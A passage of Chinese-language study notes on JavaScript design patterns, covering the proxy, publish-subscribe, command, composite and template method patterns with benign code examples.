<p>另外，假设现实中的花价格不菲，导致在程序世界里，new Flower 也是一个代价昂贵的操作，那么我们可以把 new Flower 的操作交给代理 B 去执行，代理 B 会选择在 A 心情好时再执行 new Flower，这是代理模式的另一种形式，叫作虚拟代理。虚拟代理把一些开销很大的对象，延迟到真正需要它的时候才去创建。</p>
</li>
<li>
<p>保护代理用于控制不同权限的对象对目标对象的访问，但在 JavaScript 并不容易实现保护代理，因为我们无法判断谁访问了某个对象。而虚拟代理是最常用的一种代理模式。</p>
</li>
</ul>
<h2 id="_12-代理的意义"> 12. 代理的意义</h2>
<ul>
<li>单一职责原则指的是，就一个类（通常也包括对象和函数等）而言，应该仅有一个引起它变化的原因。</li>
</ul>
<h2 id="_13-缓存代理"> 13. 缓存代理</h2>
<ul>
<li>计算乘积。</li>
</ul>
<div><pre><code><span>var</span> proxyMult <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> cache <span>=</span> <span>{</span><span>}</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> args <span>=</span> <span>Array</span><span>.</span>prototype<span>.</span><span>join</span><span>.</span><span>call</span><span>(</span>arguments<span>,</span> <span>','</span><span>)</span>
    <span>if</span> <span>(</span>args <span>in</span> cache<span>)</span> <span>{</span>
      <span>return</span> cache<span>[</span>args<span>]</span>
    <span>}</span>
    <span>return</span> <span>(</span>cache<span>[</span>args<span>]</span> <span>=</span> <span>mult</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span><span>)</span>
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>
<span>proxyMult</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>)</span> <span>// 输出：24</span>
<span>proxyMult</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>)</span> <span>// 输出：24</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_14-迭代器模式"> 14. 迭代器模式</h2>
<ul>
<li>
<p>迭代器模式是指提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。迭代器模式可以把迭代的过程从业务逻辑中分离出来，在使用迭代器模式之后，即使不关心对象的内部构造，也可以按顺序访问其中的每个元素。目前，恐怕只有在一些 “古董级” 的语言中才会为实现一个迭代器模式而烦恼。</p>
</li>
<li>
<p>迭代器模式是一种相对简单的模式，简单到很多时候我们都不认为它是一种设计模式。目前的绝大部分语言都内置了迭代器。</p>
</li>
</ul>
<h2 id="_15-发布-订阅模式"> 15. 发布 — 订阅模式</h2>
<ul>
<li>
<p>发布 — 订阅模式又叫观察者模式，它定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。</p>
<blockquote>
<ul>
<li>可以广泛应用于异步编程中，这是一种替代传递回调函数的方案。比如，我们可以订阅 ajax 请求的 error 、 succ 等事件。</li>
<li>可以取代对象之间硬编码的通知机制，一个对象不用再显式地调用另外一个对象的某个接口。</li>
</ul>
</blockquote>
</li>
<li>
<p>小结。</p>
<blockquote>
<ul>
<li>优点：一为时间上的解耦，二为对象之间的解耦。</li>
<li>缺点：创建订阅者本身要消耗一定的时间和内存，而且当你订阅一个消息后，也许此消息最后都未发生，但这个订阅者会始终存在于内存中。另外，发布 — 订阅模式虽然可以弱化对象之间的联系，但如果过度使用的话，对象和对象之间的必要联系也将被深埋在背后，会导致程序难以跟踪维护和理解。特别是有多个发布者和订阅者嵌套到一起的时候，要跟踪一个 bug 不是件轻松的事情。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_16-全局的发布-订阅对象"> 16. 全局的发布 － 订阅对象</h2>
<div><pre><code><span>var</span> Event <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> clientList <span>=</span> <span>{</span><span>}</span><span>,</span>
    listen<span>,</span>
    trigger<span>,</span>
    remove
  <span>listen</span> <span>=</span> <span>function</span><span>(</span><span>key<span>,</span> fn</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>clientList<span>[</span>key<span>]</span><span>)</span> <span>{</span>
      clientList<span>[</span>key<span>]</span> <span>=</span> <span>[</span><span>]</span>
    <span>}</span>
    clientList<span>[</span>key<span>]</span><span>.</span><span>push</span><span>(</span>fn<span>)</span>
  <span>}</span>
  <span>trigger</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> key <span>=</span> <span>Array</span><span>.</span>prototype<span>.</span><span>shift</span><span>.</span><span>call</span><span>(</span>arguments<span>)</span><span>,</span>
      fns <span>=</span> clientList<span>[</span>key<span>]</span>
    <span>if</span> <span>(</span><span>!</span>fns <span>||</span> fns<span>.</span>length <span>===</span> <span>0</span><span>)</span> <span>{</span>
      <span>return</span> <span>false</span>
    <span>}</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>,</span> fn<span>;</span> <span>(</span>fn <span>=</span> fns<span>[</span>i<span>++</span><span>]</span><span>)</span><span>;</span> <span>)</span> <span>{</span>
      <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>remove</span> <span>=</span> <span>function</span><span>(</span><span>key<span>,</span> fn</span><span>)</span> <span>{</span>
    <span>var</span> fns <span>=</span> clientList<span>[</span>key<span>]</span>
    <span>if</span> <span>(</span><span>!</span>fns<span>)</span> <span>{</span>
      <span>return</span> <span>false</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>!</span>fn<span>)</span> <span>{</span>
      fns <span>&amp;&amp;</span> <span>(</span>fns<span>.</span>length <span>=</span> <span>0</span><span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>for</span> <span>(</span><span>var</span> l <span>=</span> fns<span>.</span>length <span>-</span> <span>1</span><span>;</span> l <span>>=</span> <span>0</span><span>;</span> l<span>--</span><span>)</span> <span>{</span>
        <span>var</span> _fn <span>=</span> fns<span>[</span>l<span>]</span>
        <span>if</span> <span>(</span>_fn <span>===</span> fn<span>)</span> <span>{</span>
          fns<span>.</span><span>splice</span><span>(</span>l<span>,</span> <span>1</span><span>)</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>{</span>
    <span>listen</span><span>:</span> listen<span>,</span>
    <span>trigger</span><span>:</span> trigger<span>,</span>
    <span>remove</span><span>:</span> remove<span>,</span>
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>
Event<span>.</span><span>listen</span><span>(</span><span>'squareMeter88'</span><span>,</span> <span>function</span><span>(</span><span>price</span><span>)</span> <span>{</span>
  <span>// 小红订阅消息</span>
  console<span>.</span><span>log</span><span>(</span><span>'价格= '</span> <span>+</span> price<span>)</span> <span>// 输出：'价格=2000000'</span>
<span>}</span><span>)</span>
Event<span>.</span><span>trigger</span><span>(</span><span>'squareMeter88'</span><span>,</span> <span>2000000</span><span>)</span> <span>// 售楼处发布消息</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br></div></div><h2 id="_17-必须先订阅再发布吗"> 17. 必须先订阅再发布吗</h2>
<ul>
<li>
<p>我们所了解到的发布 — 订阅模式，都是订阅者必须先订阅一个消息，随后才能接收到发布者发布的消息。如果把顺序反过来，发布者先发布一条消息，而在此之前并没有对象来订阅它，这条消息无疑将消失在宇宙中。</p>
</li>
<li>
<p>在某些情况下，我们需要先将这条消息保存下来，等到有对象来订阅它的时候，再重新把消息发布给订阅者。就如同 QQ 中的离线消息一样，离线消息被保存在服务器中，接收人下次登录上线之后，可以重新收到这条消息。</p>
</li>
</ul>
<h2 id="_18-javascript-实现发布-订阅模式的便利性"> 18. JavaScript 实现发布 － 订阅模式的便利性</h2>
<ul>
<li>在 Java 中实现一个自己的发布 — 订阅模式，通常会把订阅者对象自身当成引用传入发布者对象中，同时订阅者对象还需提供一个名为诸如 update 的方法，供发布者对象在适合的时候调用。而在 JavaScript 中，我们用注册回调函数的形式来代替传统的发布 — 订阅模式，显得更加优雅和简单。</li>
</ul>
<h2 id="_19-命令模式"> 19. 命令模式</h2>
<ul>
<li>
<p>命令模式是最简单和优雅的模式之一，命令模式中的命令（command）指的是一个执行某些特定事情的指令。</p>
</li>
<li>
<p>命令模式最常见的应用场景是：有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么。此时希望用一种松耦合的方式来设计程序，使得请求发送者和请求接收者能够消除彼此之间的耦合关系。</p>
</li>
<li>
<p>小结：跟许多其他语言不同，JavaScript 可以用高阶函数非常方便地实现命令模式。命令模式在 JavaScript 语言中是一种隐形的模式。</p>
</li>
</ul>
<h2 id="_20-javascript-中的命令模式"> 20. JavaScript 中的命令模式</h2>
<ul>
<li>
<p>命令模式的由来，其实是回调（callback）函数的一个面向对象的替代品。</p>
</li>
<li>
<p>JavaScript 作为将函数作为一等对象的语言，跟策略模式一样，命令模式也早已融入到了 JavaScript 语言之中。</p>
</li>
</ul>
<div><pre><code><span>var</span> <span>bindClick</span> <span>=</span> <span>function</span><span>(</span><span>button<span>,</span> func</span><span>)</span> <span>{</span>
  button<span>.</span>onclick <span>=</span> func
<span>}</span>
<span>var</span> MenuBar <span>=</span> <span>{</span>
  <span>refresh</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'刷新菜单界面'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> SubMenu <span>=</span> <span>{</span>
  <span>add</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'增加子菜单'</span><span>)</span>
  <span>}</span><span>,</span>
  <span>del</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'删除子菜单'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>bindClick</span><span>(</span>button1<span>,</span> MenuBar<span>.</span>refresh<span>)</span>
<span>bindClick</span><span>(</span>button2<span>,</span> SubMenu<span>.</span>add<span>)</span>
<span>bindClick</span><span>(</span>button3<span>,</span> SubMenu<span>.</span>del<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h2 id="_21-宏命令"> 21. 宏命令</h2>
<ul>
<li>
<p>宏命令是一组命令的集合，通过执行宏命令的方式，可以一次执行一批命令。</p>
</li>
<li>
<p>宏命令是命令模式与组合模式的联用产物。</p>
</li>
</ul>
<div><pre><code><span>var</span> closeDoorCommand <span>=</span> <span>{</span>
  <span>execute</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'关门'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> openPcCommand <span>=</span> <span>{</span>
  <span>execute</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'开电脑'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> openQQCommand <span>=</span> <span>{</span>
  <span>execute</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'登录 QQ'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>var</span> <span>MacroCommand</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>commandsList</span><span>:</span> <span>[</span><span>]</span><span>,</span>
    <span>add</span><span>:</span> <span>function</span><span>(</span><span>command</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>commandsList<span>.</span><span>push</span><span>(</span>command<span>)</span>
    <span>}</span><span>,</span>
    <span>execute</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
      <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>,</span> command<span>;</span> <span>(</span>command <span>=</span> <span>this</span><span>.</span>commandsList<span>[</span>i<span>++</span><span>]</span><span>)</span><span>;</span> <span>)</span> <span>{</span>
        command<span>.</span><span>execute</span><span>(</span><span>)</span>
      <span>}</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>
<span>var</span> macroCommand <span>=</span> <span>MacroCommand</span><span>(</span><span>)</span>
macroCommand<span>.</span><span>add</span><span>(</span>closeDoorCommand<span>)</span>
macroCommand<span>.</span><span>add</span><span>(</span>openPcCommand<span>)</span>
macroCommand<span>.</span><span>add</span><span>(</span>openQQCommand<span>)</span>
macroCommand<span>.</span><span>execute</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><h2 id="_22-组合模式"> 22. 组合模式</h2>
<ul>
<li>
<p>组合模式将对象组合成树形结构，以表示 “部分——整体” 的层次结构。除了用来表示树形结构之外，组合模式的另一个好处是通过对象的多态性表现，使得用户对单个对象和组合对象的使用具有一致性，下面分别说明。</p>
<blockquote>
<ul>
<li>表示树形结构。通过回顾上面的例子，我们很容易找到组合模式的一个优点：提供了一种遍历树形结构的方案，通过调用组合对象的 execute 方法，程序会递归调用组合对象下面的叶对象的 execute 方法，所以我们的万能遥控器只需要一次操作，便能依次完成关门、打开电脑、登录 QQ 这几件事情。组合模式可以非常方便地描述对象部分——整体层次结构。</li>
<li>利用对象多态性统一对待组合对象和单个对象。利用对象的多态性表现，可以使客户端忽略组合对象和单个对象的不同。在组合模式中，客户将统一地使用组合结构中的所有对象，而不需要关心它究竟是组合对象还是单个对象。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>var</span> <span>Folder</span> <span>=</span> <span>function</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>this</span><span>.</span>files <span>=</span> <span>[</span><span>]</span>
<span>}</span>
<span>Folder</span><span>.</span>prototype<span>.</span><span>add</span> <span>=</span> <span>function</span><span>(</span><span>file</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>files<span>.</span><span>push</span><span>(</span>file<span>)</span>
<span>}</span>
<span>Folder</span><span>.</span>prototype<span>.</span><span>scan</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'开始扫描文件夹: '</span> <span>+</span> <span>this</span><span>.</span>name<span>)</span>
  <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>,</span> file<span>,</span> files <span>=</span> <span>this</span><span>.</span>files<span>;</span> <span>(</span>file <span>=</span> files<span>[</span>i<span>++</span><span>]</span><span>)</span><span>;</span> <span>)</span> <span>{</span>
    file<span>.</span><span>scan</span><span>(</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>var</span> <span>File</span> <span>=</span> <span>function</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
<span>}</span>
<span>File</span><span>.</span>prototype<span>.</span><span>add</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'文件下面不能再添加文件'</span><span>)</span>
<span>}</span>
<span>File</span><span>.</span>prototype<span>.</span><span>scan</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'开始扫描文件: '</span> <span>+</span> <span>this</span><span>.</span>name<span>)</span>
<span>}</span>

<span>var</span> folder <span>=</span> <span>new</span> <span>Folder</span><span>(</span><span>'学习资料'</span><span>)</span>
<span>var</span> folder1 <span>=</span> <span>new</span> <span>Folder</span><span>(</span><span>'JavaScript'</span><span>)</span>
<span>var</span> folder2 <span>=</span> <span>new</span> <span>Folder</span><span>(</span><span>'jQuery'</span><span>)</span>
<span>var</span> file1 <span>=</span> <span>new</span> <span>File</span><span>(</span><span>'JavaScript 设计模式与开发实践'</span><span>)</span>
<span>var</span> file2 <span>=</span> <span>new</span> <span>File</span><span>(</span><span>'精通 jQuery'</span><span>)</span>
<span>var</span> file3 <span>=</span> <span>new</span> <span>File</span><span>(</span><span>'重构与模式'</span><span>)</span>
folder1<span>.</span><span>add</span><span>(</span>file1<span>)</span>
folder2<span>.</span><span>add</span><span>(</span>file2<span>)</span>
folder<span>.</span><span>add</span><span>(</span>folder1<span>)</span>
folder<span>.</span><span>add</span><span>(</span>folder2<span>)</span>
folder<span>.</span><span>add</span><span>(</span>file3<span>)</span>

<span>var</span> folder3 <span>=</span> <span>new</span> <span>Folder</span><span>(</span><span>'Nodejs'</span><span>)</span>
<span>var</span> file4 <span>=</span> <span>new</span> <span>File</span><span>(</span><span>'深入浅出 Node.js'</span><span>)</span>
folder3<span>.</span><span>add</span><span>(</span>file4<span>)</span>
<span>var</span> file5 <span>=</span> <span>new</span> <span>File</span><span>(</span><span>'JavaScript 语言精髓与编程实践'</span><span>)</span>
folder<span>.</span><span>add</span><span>(</span>folder3<span>)</span>
folder<span>.</span><span>add</span><span>(</span>file5<span>)</span>

folder<span>.</span><span>scan</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br></div></div><h2 id="_23-何时使用组合模式"> 23. 何时使用组合模式</h2>
<ul>
<li>
<p>组合模式如果运用得当，可以大大简化客户的代码。一般来说，组合模式适用于以下这两种情况。</p>
<blockquote>
<ul>
<li>表示对象的 部分——整体 层次结构。组合模式可以方便地构造一棵树来表示对象的 部分——整体 结构。特别是我们在开发期间不确定这棵树到底存在多少层次的时候。在树的构造最终完成之后，只需要通过请求树的最顶层对象，便能对整棵树做统一的操作。在组合模式中增加和删除树的节点非常方便，并且符合 开放—封闭 原则。</li>
<li>客户希望统一对待树中的所有对象。组合模式使客户可以忽略组合对象和叶对象的区别，客户在面对这棵树的时候，不用关心当前正在处理的对象是组合对象还是叶对象，也就不用写一堆 if 、else 语句来分别处理它们。组合对象和叶对象会各自做自己正确的事情，这是组合模式最重要的能力。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_24-模板方法模式"> 24. 模板方法模式</h2>
<ul>
<li>
<p>模板方法模式是一种只需使用继承就可以实现的非常简单的模式。</p>
</li>
<li>
<p>模板方法模式由两部分结构组成，第一部分是抽象父类，第二部分是具体的实现子类。通常在抽象父类中封装了子类的算法框架，包括实现一些公共方法以及封装子类中所有方法的执行顺序。子类通过继承这个抽象类，也继承了整个算法结构，并且可以选择重写父类的方法。</p>
</li>
<li>
<p>小结：在 JavaScript 中，我们很多时候都不需要依样画瓢地去实现一个模版方法模式，高阶函数是更好的选择。</p>
</li>
</ul>
<h2 id="_25-coffee-or-tea"> 25. Coffee or Tea</h2>
<ul>
<li>Beverage.prototype.init 被称为模板方法的原因是，该方法中封装了子类的算法框架，它作为一个算法的模板，指导子类以何种顺序去执行哪些方法。在 Beverage.prototype.init 方法中，算法内的每一个步骤都清楚地展示在我们眼前。</li>
</ul>
<div><pre><code><span>var</span> <span>Beverage</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>Beverage</span><span>.</span>prototype<span>.</span><span>boilWater</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'把水煮沸'</span><span>)</span>
<span>}</span>
<span>Beverage</span><span>.</span>prototype<span>.</span><span>brew</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span> <span>// 空方法，应该由子类重写</span>
<span>Beverage</span><span>.</span>prototype<span>.</span><span>pourInCup</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span> <span>// 空方法，应该由子类重写</span>
<span>Beverage</span><span>.</span>prototype<span>.</span><span>addCondiments</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span> <span>// 空方法，应该由子类重写</span>
<span>// 模板方法</span>
<span>Beverage</span><span>.</span>prototype<span>.</span><span>init</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span><span>boilWater</span><span>(</span><span>)</span>
  <span>this</span><span>.</span><span>brew</span><span>(</span><span>)</span>
  <span>this</span><span>.</span><span>pourInCup</span><span>(</span><span>)</span>
  <span>this</span><span>.</span><span>addCondiments</span><span>(</span><span>)</span>
<span>}</span>

<span>var</span> <span>Coffee</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>Coffee</span><span>.</span>prototype <span>=</span> <span>new</span> <span>Beverage</span><span>(</span><span>)</span>
<span>Coffee</span><span>.</span>prototype<span>.</span><span>brew</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'用沸水冲泡咖啡'</span><span>)</span>
<span>}</span>
<span>Coffee</span><span>.</span>prototype<span>.</span><span>pourInCup</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'把咖啡倒进杯子'</span><span>)</span>
<span>}</span>
<span>Coffee</span><span>.</span>prototype<span>.</span><span>addCondiments</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'加糖和牛奶'</span><span>)</span>
<span>}</span>
<span>var</span> coffee <span>=</span> <span>new</span> <span>Coffee</span><span>(</span><span>)</span>
coffee<span>.</span><span>init</span><span>(</span><span>)</span>

<span>var</span> <span>Tea</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>Tea</span><span>.</span>prototype <span>=</span> <span>new</span> <span>Beverage</span><span>(</span><span>)</span>
<span>Tea</span><span>.</span>prototype<span>.</span><span>brew</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'用沸水浸泡茶叶'</span><span>)</span>
<span>}</span>
<span>Tea</span><span>.</span>prototype<span>.</span><span>pourInCup</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'把茶倒进杯子'</span><span>)</span>
<span>}</span>
<span>Tea</span><span>.</span>prototype<span>.</span><span>addCondiments</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'加柠檬'</span><span>)</span>
<span>}</span>
<span>var</span> tea <span>=</span> <span>new</span> <span>Tea</span><span>(</span><span>)</span>
tea<span>.</span><span>init</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br></div></div><h2 id="_26-真的需要-继承-吗"> 26. 真的需要 “继承” 吗</h2>
<ul>
<li>模板方法模式是为数不多的基于继承的设计模式，但 JavaScript 语言实际上没有提供真正的类式继承（ES6 有了 class），继承是通过对象与对象之间的委托来实现的。也就是说，虽然我们在形式上借鉴了提供类式继承的语言，但本章学习到的模板方法模式并不十分正宗。而且在 JavaScript 这般灵活的语言中，实现这样一个例子，是否真的需要继承这种重武器呢？</li>
</ul>
<div><pre><code><span>var</span> <span>Beverage</span> <span>=</span> <span>function</span><span>(</span><span>param</span><span>)</span> <span>{</span>
  <span>var</span> <span>boilWater</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'把水煮沸'</span><span>)</span>
  <span>}</span>
  <span>var</span> brew <span>=</span>
    param<span>.</span>brew <span>||</span>
    <span>function</span><span>(</span><span>)</span> <span>{</span>
      <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'必须传递 brew 方法'</span><span>)</span>
    <span>}</span>
  <span>var</span> pourInCup <span>=</span>
    param<span>.</span>pourInCup <span>||</span>
    <span>function</span><span>(</span><span>)</span> <span>{</span>
      <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'必须传递 pourInCup 方法'</span><span>)</span>
    <span>}</span>
  <span>var</span> addCondiments <span>=</span>
    param<span>.</span>addCondiments <span>||</span>
    <span>function</span><span>(</span><span>)</span> <span>{</span>
      <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'必须传递 addCondiments 方法'</span><span>)</span>
    <span>}</span>
  <span>var</span> <span>F</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype<span>.</span><span>init</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>boilWater</span><span>(</span><span>)</span>
    <span>brew</span><span>(</span><span>)</span>
    <span>pourInCup</span><span>(</span><span>)</span>
    <span>addCondiments</span><span>(</span><span>)</span>
  <span>}</span>
  <span>return</span> <span>F</span>
<span>}</span>
<span>var</span> Coffee <span>=</span> <span>Beverage</span><span>(</span><span>{</span>
  <span>brew</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'用沸水冲泡咖啡'</span><span>)</span>
  <span>}</span><span>,</span>
  <span>pourInCup</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'把咖啡倒进杯子'</span><span>)</span>
  <span>}</span><span>,</span>
  <span>addCondiments</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'加糖和牛奶'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
<span>var</span> Tea <span>=</span> <span>Beverage</span><span>(</span><span>{</span>
  <span>brew</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'用沸水浸泡茶叶'</span><span>)</span>
  <span>}</span><span>,</span>
  <span>pourInCup</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'把茶倒进杯子'</span><span>)</span>
  <span>}</span><span>,</span>
  <span>addCondiments</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'加柠檬'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
<span>var</span> coffee <span>=</span> <span>new</span> <span>Coffee</span><span>(</span><span>)</span>
coffee<span>.</span><span>init</span><span>(</span><span>)</span>
<span>var</span> tea <span>=</span> <span>new</span> <span>Tea</span><span>(</span><span>)</span>
tea<span>.</span><span>init</span><span>(</span><span>)</span>
</code></pre>
